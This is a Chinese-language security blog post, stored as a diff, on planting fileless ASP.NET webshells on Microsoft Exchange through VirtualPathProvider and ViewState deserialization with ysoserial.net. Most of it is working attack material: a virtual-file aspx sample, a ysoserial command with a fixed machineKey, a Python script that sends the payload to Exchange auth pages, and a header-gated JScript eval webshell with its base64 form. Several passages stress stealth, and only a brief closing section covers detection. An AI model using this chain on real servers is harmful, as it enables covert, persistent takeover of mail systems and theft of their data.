@@ -1,0 +1,286 @@
+I"�5<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>通过ASP.NET的VirtualPathProvider类能够创建虚拟文件，实现以下效果：虚拟文件不存在于服务器的文件系统，但是能够对其动态编译并提供访问服务。<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>提供了一种可供学习的利用思路。</p>
+
+<p>本文将要介绍虚拟文件的利用方法，在<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>基础上介绍Exchange下的利用方法，开源代码，记录细节，给出防御建议。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>VirtualPathProvider在Exchange下的利用</li>
+  <li>DotNet反序列化在Exchange下的利用</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-virtualpathprovider在exchange下的利用">0x02 VirtualPathProvider在Exchange下的利用</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8</p>
+
+<p>在实现上需要继承VirtualPathProvider类并重写两个方法：FileExists和GetFile，注册VirtualPathProvider并创建实例后，实现虚拟文件的创建</p>
+
+<p>示例代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="C#" AutoEventWireup="true" validateRequest="false" EnableViewStateMac="false" %&gt;
+&lt;%@ Import Namespace="System.Web.Hosting" %&gt;
+&lt;%@ Import Namespace="System.Web.Compilation" %&gt;
+&lt;%@ Import Namespace="System.IO" %&gt;
+&lt;%@ Import Namespace="System.Reflection" %&gt;
+&lt;%@ Import Namespace="System.Security.Cryptography" %&gt;
+&lt;script runat="server"&gt;
+
+    public class DeferredPathProvider : VirtualPathProvider
+    {
+        public DeferredPathProvider() : base()
+        {
+        }
+
+        public bool IsTargetVirtualPath(string virtualPath)
+        {
+            string path = VirtualPathUtility.ToAppRelative(virtualPath);
+            return path.StartsWith("~/deferred", StringComparison.InvariantCultureIgnoreCase);
+        }
+
+        public override VirtualFile GetFile(string virtualPath)
+        {
+            if (IsTargetVirtualPath(virtualPath))
+            {
+                return new DeferredVirtualFile(this, virtualPath);
+            }
+            else
+            {
+                return Previous.GetFile(virtualPath);
+            }
+        }
+
+        public override bool FileExists(string virtualPath)
+        {
+            return IsTargetVirtualPath(virtualPath) ? true : Previous.FileExists(virtualPath);
+        }
+    }
+
+    public class DeferredVirtualFile : VirtualFile
+    {
+        DeferredPathProvider provider = null;
+
+        public DeferredVirtualFile(DeferredPathProvider provider, string virtualFile) : base(virtualFile)
+        {
+            this.provider = provider;
+        }
+
+        public override Stream Open()
+        {
+        Stream stream = new MemoryStream();
+
+        StreamWriter writer = new StreamWriter(stream);
+        writer.Write("&lt;%@ Page Language=\"C#\" AutoEventWireup=\"true\" %&gt;\r\n" +
+            "&lt;% Response.Write(\"Compiled on the fly :)\"); %&gt;");
+        writer.Flush();
+        stream.Seek(0, SeekOrigin.Begin);
+
+        return stream;
+        }
+    }
+
+    private Page handler = null;
+    public void Page_Load()
+    {
+        DeferredPathProvider provider = new DeferredPathProvider();
+        typeof(HostingEnvironment).GetMethod("RegisterVirtualPathProviderInternal",
+        BindingFlags.Static | BindingFlags.InvokeMethod | BindingFlags.NonPublic)
+        .Invoke(null, new object[] { provider });
+        
+        handler = (Page) BuildManager.CreateInstanceFromVirtualPath("~/deferred.aspx", typeof(Page));
+        handler.ProcessRequest(HttpContext.Current);
+    }
+
+    protected override void Render(HtmlTextWriter writer)
+    {
+    }
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>代码来自https://kernel32.org/posts/evading-anti-virus-by-using-dynamic-code-generation-and-reflection/</p>
+
+<p>在Exchange上进行如下测试：</p>
+
+<p>保存位置：<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\test1.aspx</code></p>
+
+<p>访问url:<code class="language-plaintext highlighter-rouge">https://&lt;url&gt;/owa/auth/test1.aspx/deferred.aspx</code>，返回结果:<code class="language-plaintext highlighter-rouge">Compiled on the fly :)</code>，虚拟文件被成功访问</p>
+
+<p><strong>注：</strong></p>
+
+<p>虚拟文件的可访问路径为:<code class="language-plaintext highlighter-rouge">https://&lt;url&gt;/owa/auth/test1.aspx/&lt;任意字符&gt;</code></p>
+
+<p>创建虚拟文件时，会在临时目录下产生编译文件，默认位置：<code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework64|Framework\&lt;version&gt;\Temporary ASP.NET Files\owa\&lt;hash1&gt;\&lt;hash2&gt;\</code></p>
+
+<p>文件名称：<code class="language-plaintext highlighter-rouge">test1.aspx.&lt;hash3&gt;.compiled</code></p>
+
+<p>如果删除原文件test1.aspx，那么虚拟文件也随之失效，无法访问</p>
+
+<p>通过这种方式实现的Webshell，虽然能够隐藏真实的文件内容，但是需要依赖文件，容易被清除，隐蔽性不够</p>
+
+<p>而利用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>的<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>恰恰能够解决这个问题，提高隐蔽性。</p>
+
+<h2 id="0x03-dotnet反序列化的利用">0x03 DotNet反序列化的利用</h2>
+<hr />
+
+<p>参考代码：</p>
+
+<p>https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs</p>
+
+<p>测试环境：</p>
+
+<p>获得了Exchange文件读写权限，能够修改<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config</code>和<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config</code>，设置machineKey的内容如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" /&gt;</code></p>
+
+<p>对于这两个位置的.Net反序列化命令执行，不再需要合法用户的凭据</p>
+
+<p>这里选择<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx</code>，对应的generator为<code class="language-plaintext highlighter-rouge">042A94E8</code></p>
+
+<p>使用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>生成ViewState的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -f LosFormatter -c "ghostfile.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="042A94E8"
+</code></pre></div></div>
+
+<p>使用如下代码发送ViewState：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># encoding: UTF-8
+import requests
+import re
+import sys
+import os
+import json
+import urllib3
+urllib3.disable_warnings()
+
+from urllib.parse import quote
+import urllib.parse
+
+if __name__ == '__main__':
+    if len(sys.argv)!=4:
+        note = '''
+Usage:
+    &lt;url&gt; &lt;key&gt; &lt;path&gt;
+&lt;path&gt;: owa or ecp
+
+eg.    
+    {0} 192.168.1.1 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF owa
+    {1} mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    
+        '''
+        print(note.format(sys.argv[0],sys.argv[0]))
+        sys.exit(0)
+    else:
+        targeturl = "";
+        generator = ""; 
+        try:
+            if sys.argv[3] == "owa":
+                targeturl = "https://" + sys.argv[1] + "/owa/auth/errorFE.aspx";
+                generator = "042A94E8";
+
+            elif sys.argv[3] == "ecp":
+                targeturl = "https://" + sys.argv[1] + "/ecp/auth/TimeoutLogout.aspx";
+                generator = "277B1C2A";
+            else:
+                print("[!] Wrong input");
+
+            print("[*] TargetURL: " + targeturl)
+
+            out_payload = "&lt;ViewState Data&gt;"
+
+            body = {"__VIEWSTATEGENERATOR": generator,"__VIEWSTATE": out_payload}
+            postData = urllib.parse.urlencode(body).encode("utf-8")
+
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx",
+                "Content-Type":"application/x-www-form-urlencoded"
+            } 
+            status = requests.post(url=targeturl, headers=headers, data=postData, verify=False, timeout=15)
+
+            print(status.status_code)
+            print(status.headers)
+            print(status.text) 
+
+        except Exception as e:
+            print("[!] Error:%s"%(e))
+            exit(0)
+</code></pre></div></div>
+
+<p>访问<code class="language-plaintext highlighter-rouge">https://&lt;url&gt;/owa/auth/fakepath31337/&lt;任意字符&gt;.aspx</code>，返回结果:<code class="language-plaintext highlighter-rouge">This is the attacker's file - running on the server if this 1337 is 1337.</code>，虚拟文件被成功访问</p>
+
+<p>这种方式不需要依赖文件，提高隐蔽性</p>
+
+<p>接下来修改<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>实现Webshell的功能</p>
+
+<p>将虚拟目录设置为根目录，访问的url示例：<code class="language-plaintext highlighter-rouge">https://&lt;url&gt;/owa/auth/&lt;任意字符&gt;.aspx</code></p>
+
+<p>为了避免意外访问，需要添加访问条件，填入Header判断，如果不满足条件跳转至错误页面<code class="language-plaintext highlighter-rouge">errorFE.aspx</code></p>
+
+<p>一句话的测试代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;%@ Page Language="Jscript"%&gt;&lt;%
+if(Request.Headers["Value"]=="00HGAT3K0AXHV2RF2W0G")
+{
+eval(Request.Item["antsword"],"unsafe");	
+}
+else
+{
+Response.Redirect("/owa/auth/errorFE.aspx?httpCode=404");
+}
+%&gt;
+</code></pre></div></div>
+
+<p>使用AntSword连接时，需要设置HTTP HEADERS，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name:  Value
+Value: 00HGAT3K0AXHV2RF2W0G
+</code></pre></div></div>
+
+<p>Base64后的字符为：<code class="language-plaintext highlighter-rouge">PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQiJT48JQppZihSZXF1ZXN0LkhlYWRlcnNbIlZhbHVlIl09PSIwMEhHQVQzSzBBWEhWMlJGMlcwRyIpCnsKZXZhbChSZXF1ZXN0Lkl0ZW1bImFudHN3b3JkIl0sInVuc2FmZSIpOwkKfQplbHNlCnsKUmVzcG9uc2UuUmVkaXJlY3QoIi9vd2EvYXV0aC9lcnJvckZFLmFzcHg/aHR0cENvZGU9NDA0Iik7Cn0KJT4=</code></p>
+
+<p>替换<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>中的<code class="language-plaintext highlighter-rouge">webshellContentsBase64</code></p>
+
+<p>完整的Python实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-ghostfile.py</p>
+
+<p>代码支持两个位置的反序列化执行，分别为默认存在的文件<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx</code>和<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx</code>，能够自动生成带有Webshell功能的GhostWebShell.cs，使用<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>生成ViewState并发送</p>
+
+<p>完整的C#实现代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDeserializeShell-NoAuth-ghostfile.cs</p>
+
+<p>代码功能同上，可直接编译并执行，不再依赖<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a></p>
+
+<p><strong>注：</strong></p>
+
+<p>为了便于在Exchange下进行测试，我将<a href="https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs">GhostWebShell.cs</a>修改成了aspx文件，可以直接访问进行测试，代码地址如下：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/PageLoad_ghostfile.aspx</p>
+
+<h2 id="0x04-防御检测">0x04 防御检测</h2>
+<hr />
+
+<p>利用虚拟文件创建的ASP.NET Webshell，不再需要写入aspx文件，在防御上可监控临时目录下产生的编译文件，默认位置：<code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework64|Framework\&lt;version&gt;\Temporary ASP.NET Files\owa\&lt;hash1&gt;\&lt;hash2&gt;\</code></p>
+
+<p>需要注意的是攻击者在产生编译文件后可以进行删除</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了虚拟文件的利用方法，针对Exchange环境，分别介绍了VirtualPathProvider和DotNet反序列化的利用，给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
